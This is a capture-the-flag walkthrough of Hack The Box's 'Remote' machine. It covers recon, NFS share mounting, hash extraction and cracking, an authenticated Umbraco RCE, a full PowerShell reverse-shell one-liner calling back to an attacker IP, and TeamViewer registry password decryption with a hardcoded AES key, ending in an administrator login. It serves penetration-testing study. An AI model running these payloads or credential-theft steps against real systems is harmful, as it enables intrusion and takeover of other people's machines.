# Box 



![](img/Pasted%20image%2020210819045145.png)

https://www.hackthebox.eu/home/machines/profile/234

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.180 10.10.10.180
```

![](img/Pasted%20image%2020210819061943.png)

Let's enumerate with `ffuf` :

```
ffuf -u http://remote.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![](img/Pasted%20image%2020210819061815.png)

We found a `umbraco` directory which is interesting. 

![](img/Pasted%20image%2020210819061904.png)

There is a login page, I tried different SQL injection but failed. 

From there i was blocked so I check the differents port that we saw on the `nmap` scan. 

Let's what's inside the nfs service.

```sh
showmount -e remote.htb
```

![](img/Pasted%20image%2020210819062135.png)

We can mount this directory to read it.

```sh
mount -t nfs -o vers=2  remote.htb:site_backups nfs -o nolock 
```

I copied the whole directory in local and removed the mounted dir.

![](img/Pasted%20image%2020210819062318.png)

There are a lot of files. 

![](img/Pasted%20image%2020210819062342.png)

In this directory we can see a `.sdf` file which a database file. We can use `strings` to try to read it.

![](img/Pasted%20image%2020210819062430.png)

```
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@{pv
qpkaj
```

Too much information but we can keep the important one. 

There are two users, called `admin@htb.local` and `ssmith@htb.local`

it seems we also have their hashes.

| User | Hash | Hash mode |
| ---- |  ----- | ------  |
| admin@htb.local | b8be16afba8c314ad33d812f22a04991b90e2aaa | SHA-1 |
| ssmith@htb.local | jxDUCcruzN8rSRlqnfmvqw\=\=AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts | HMACSHA256 |

Let's focus on the admin first. 

I use hashcat to crack the password.

```
hashcat.exe -a 0 -m 100 ../hashes.txt rockyou.txt -o out.txt
```

```
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```

So now we have valid credentials. Let's log in the website.

| User | Hash | 
| ---- |  ----- | 
| admin@htb.local | baconandcheese | 

![](img/Pasted%20image%2020210819072156.png)

Earlier when  I was searching for an exploited I found a RCE who needed to be authenticated.

## Exploitation

```
searchsploit umbracos
```

![](img/Pasted%20image%2020210819063522.png)

Let's try then, I set up a webserver on my machine running on port 4444.

![](img/Pasted%20image%2020210819071118.png)

It is working ! Now we can get a shell.

I used the nishang one liner to get my powershell. 
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Then I converted it in base64 to be easier for me to use it in a double quote.
Like this 
```
echo "<replace_text>"  | iconv -t utf-16le | base64 -w 0
```

![](img/Pasted%20image%2020210819071959.png)

![](img/Pasted%20image%2020210819072100.png)

## Post-Exploitation
### User

It seems that we have no user because our flag is in public.
![](img/Pasted%20image%2020210819072717.png)

To root.

### Root

Using tasklist, we can see an interesting file running : 

![](img/Pasted%20image%2020210819081939.png)

On metasploit there is a module to get the passwords but let's do it manually.

![](img/Pasted%20image%2020210819082055.png)


For out curren version of teamviewver 7, the keys to find the password are located  in 
`HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`

There are a lot of item that we can see using `get-itemproperty -path .`

![](img/Pasted%20image%2020210819082302.png)

Let's get the whole key 

```
(get-itemproperty -path .).SecurityPasswordAES :


255 155 28 115 214 107 206 49 172 65 62 174 19 27 70 79 88 47 108 226 209 225 243 218 126 141 55 107 38 57 78 91 
```



I found this script to decrypt the password : 
https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0

Replace the key by yours... 

```py
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 
                    126, 141, 55, 107, 38, 57, 78, 91])
key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")


raw_un = AESCipher(key).decrypt(iv, ciphertext)

password = raw_un.decode('utf-16')
print("Decrypted password is : ",password)
```

![](img/Pasted%20image%2020210819084021.png)


Let's try to log in as administrator now ! 

```
psexec.py 'administrator:!R3m0te!@10.10.10.180' 
```

![](img/Pasted%20image%2020210819085641.png)

Rooted.